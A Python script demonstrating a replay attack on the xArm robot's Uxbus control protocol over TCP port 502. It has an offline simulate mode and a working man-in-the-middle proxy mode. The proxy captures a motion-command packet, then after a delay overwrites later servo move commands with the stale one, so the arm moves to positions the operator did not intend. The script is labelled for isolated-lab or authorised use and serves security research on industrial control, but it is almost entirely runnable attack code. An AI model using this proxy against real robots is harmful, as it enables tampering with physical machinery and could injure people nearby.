#!/usr/bin/env python3
"""
Uxbus replay-attack demonstration (educational / isolated-lab use only).

Shows how an on-path attacker can capture legitimate MOVE_SERVO_CART_AA packets
and later re-inject stale ones so bytes on TCP:502 differ from what the benign
program intended.

Modes
-----
simulate (default)
    No robot needed. Prints benign vs attacked packet hex and decoded pose diffs.

proxy
    MITM: PC -> localhost:1502 -> xArm:502. Logs frames; with --attack replaces
    outgoing funcode=93 bodies with the first captured stale packet.

Examples
--------
python examples/xarm_security/uxbus_replay_attack_demo.py simulate

python examples/xarm_security/uxbus_replay_attack_demo.py proxy \\
    --target-ip 192.168.1.204 --attack --attack-delay-s 5
"""

from __future__ import annotations

import argparse
import json
import socket
import struct
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path

from uxbus_codec import (
    MOVE_SERVO_CART_AA,
    MoveServoCartAa,
    UxbusFrame,
    build_move_servo_cart_aa,
    decode_move_if_present,
    hex_diff,
    parse_frame,
    PRIVATE_PROTO,
)


def _benign_trajectory(n: int, x0: float = 300.0, step: float = 2.0) -> list[MoveServoCartAa]:
    return [
        MoveServoCartAa(
            x_mm=x0 + i * step,
            y_mm=0.0,
            z_mm=400.0,
            rx_rad=3.14,
            ry_rad=0.0,
            rz_rad=0.0,
            speed=300.0,
            acc=2000.0,
            tool_coord=0,
            relative=0,
        )
        for i in range(n)
    ]


def run_simulate() -> int:
    print("=" * 72)
    print("MODE: simulate — offline benign vs replay-attack packet comparison")
    print("=" * 72)

    benign_poses = _benign_trajectory(5, x0=300.0, step=2.0)
    benign_frames = [build_move_servo_cart_aa(tid, p) for tid, p in enumerate(benign_poses, start=1)]

    stale_pdu = benign_frames[0].pdu
    attacker_intended = _benign_trajectory(5, x0=308.0, step=2.0)

    print("\n[1] Benign replay stream (program intent at early timesteps)\n")
    for i, fr in enumerate(benign_frames):
        mv = decode_move_if_present(fr)
        assert mv is not None
        print(f"  frame {i}: trans_id={fr.trans_id} | {mv.summary()}")
        print(f"           hex: {fr.hex}")

    print("\n[2] Replay attack — program now commands x=308..316, wire replays x=300\n")
    for i, intended_pose in enumerate(attacker_intended):
        intended_fr = build_move_servo_cart_aa(100 + i, intended_pose)
        wire_fr = UxbusFrame(trans_id=100 + i, proto_id=PRIVATE_PROTO, funcode=MOVE_SERVO_CART_AA, pdu=stale_pdu)
        intended_mv = decode_move_if_present(intended_fr)
        wire_mv = decode_move_if_present(wire_fr)
        assert intended_mv and wire_mv
        print(f"  step {i}:")
        print(f"    intended: {intended_mv.summary()}")
        print(f"    on wire:  {wire_mv.summary()}")
        diffs = hex_diff(intended_fr.raw, wire_fr.raw)
        print(f"    {len(diffs)} byte(s) differ (PDU pose/speed/acc):")
        for line in diffs[:10]:
            print(line)
        print(f"    Δx (wire - intended): {wire_mv.x_mm - intended_mv.x_mm:+.1f} mm\n")

    print("[3] What to compare in a live lab (tcpdump / proxy log)\n")
    print("  Benign pcap:  x float @ PDU[0:4] increases each frame (LE float32)")
    print("  Attack pcap:  x float frozen at captured value (e.g. 300.0 mm)")
    print("  trans_id:     may still increment — header-only freshness is not safety")
    print("  Report :30002: actual TCP pose diverges from dataset / operator intent")
    print("\n  sudo tcpdump -i any host 192.168.1.204 and port 502 -w uxbus.pcap")
    return 0


class _StreamParser:
    def __init__(self) -> None:
        self._buf = bytearray()

    def feed(self, data: bytes) -> list[bytes]:
        self._buf.extend(data)
        out: list[bytes] = []
        while len(self._buf) >= 6:
            length = struct.unpack(">H", self._buf[4:6])[0]
            total = 6 + length
            if len(self._buf) < total:
                break
            out.append(bytes(self._buf[:total]))
            del self._buf[:total]
        return out


@dataclass
class _ProxyState:
    log_path: Path | None
    attack_enabled: bool = False
    stale_pdu: bytes | None = None
    logged: int = 0
    replaced: int = 0
    lock: threading.Lock = field(default_factory=threading.Lock)


def _patch_or_log_frame(fr_bytes: bytes, state: _ProxyState, direction: str) -> bytes:
    fr = parse_frame(fr_bytes)
    if fr is None:
        return fr_bytes

    entry: dict = {
        "t": time.time(),
        "direction": direction,
        "trans_id": fr.trans_id,
        "funcode": fr.funcode,
        "hex": fr.hex,
    }
    mv = decode_move_if_present(fr)
    if mv:
        entry["x_mm"] = mv.x_mm
        entry["y_mm"] = mv.y_mm
        entry["z_mm"] = mv.z_mm

    out = fr_bytes
    with state.lock:
        if (
            direction == "c2s"
            and state.attack_enabled
            and state.stale_pdu is not None
            and fr.funcode == MOVE_SERVO_CART_AA
        ):
            patched = UxbusFrame(trans_id=fr.trans_id, proto_id=PRIVATE_PROTO, funcode=MOVE_SERVO_CART_AA, pdu=state.stale_pdu)
            entry["action"] = "replaced_with_stale"
            entry["on_wire_hex"] = patched.hex
            out = patched.raw
            state.replaced += 1
        elif direction == "c2s" and fr.funcode == MOVE_SERVO_CART_AA and state.stale_pdu is None:
            state.stale_pdu = fr.pdu
            entry["action"] = "captured_as_stale_candidate"

        if state.log_path and direction == "c2s":
            with state.log_path.open("a") as f:
                f.write(json.dumps(entry) + "\n")
            state.logged += 1

    return out


def _relay(src: socket.socket, dst: socket.socket, direction: str, state: _ProxyState) -> None:
    parser = _StreamParser()
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                break
            frames = parser.feed(chunk)
            if not frames:
                dst.sendall(chunk)
                continue
            rebuilt = bytearray()
            for fr_bytes in frames:
                rebuilt.extend(_patch_or_log_frame(fr_bytes, state, direction))
            dst.sendall(bytes(rebuilt))
    except OSError:
        pass
    finally:
        for sock in (src, dst):
            try:
                sock.close()
            except OSError:
                pass


def run_proxy(args: argparse.Namespace) -> int:
    print("=" * 72)
    print("MODE: proxy — MITM (ISOLATED LAB / AUTHORIZED TEST ONLY)")
    print("=" * 72)
    print(f"Listen 127.0.0.1:{args.listen_port}  ->  {args.target_ip}:{args.target_port}")
    print("Configure robot_ip=127.0.0.1 and use SDK port override if available,")
    print("or route traffic through this proxy with iptables REDIRECT.")

    log_path = Path(args.log) if args.log else None
    if log_path:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        log_path.write_text("")

    state = _ProxyState(log_path=log_path)

    def _attack_timer() -> None:
        time.sleep(args.attack_delay_s)
        with state.lock:
            state.attack_enabled = True
        print(f"\n[ATTACK] Enabled after {args.attack_delay_s}s — stale PDU replay active.\n")

    if args.attack:
        threading.Thread(target=_attack_timer, daemon=True).start()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", args.listen_port))
    srv.listen(5)
    print(f"Logging to {log_path}. Waiting for connections...")

    try:
        while True:
            client, addr = srv.accept()
            print(f"Client {addr} connected.")
            upstream = socket.create_connection((args.target_ip, args.target_port), timeout=5.0)
            t1 = threading.Thread(target=_relay, args=(client, upstream, "c2s", state), daemon=True)
            t2 = threading.Thread(target=_relay, args=(upstream, client, "s2c", state), daemon=True)
            t1.start()
            t2.start()
            t1.join()
            t2.join()
            print(f"Session done. logged={state.logged} replaced={state.replaced}")
    except KeyboardInterrupt:
        print("\nStopped.")
    finally:
        srv.close()
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description="Uxbus replay attack demonstration")
    parser.add_argument("mode", choices=["simulate", "proxy"], nargs="?", default="simulate")
    parser.add_argument("--listen-port", type=int, default=1502)
    parser.add_argument("--target-ip", default="192.168.1.204")
    parser.add_argument("--target-port", type=int, default=502)
    parser.add_argument("--log", default="uxbus_capture.jsonl")
    parser.add_argument("--attack", action="store_true")
    parser.add_argument("--attack-delay-s", type=float, default=3.0)
    args = parser.parse_args()
    if args.mode == "simulate":
        return run_simulate()
    return run_proxy(args)


if __name__ == "__main__":
    sys.exit(main())
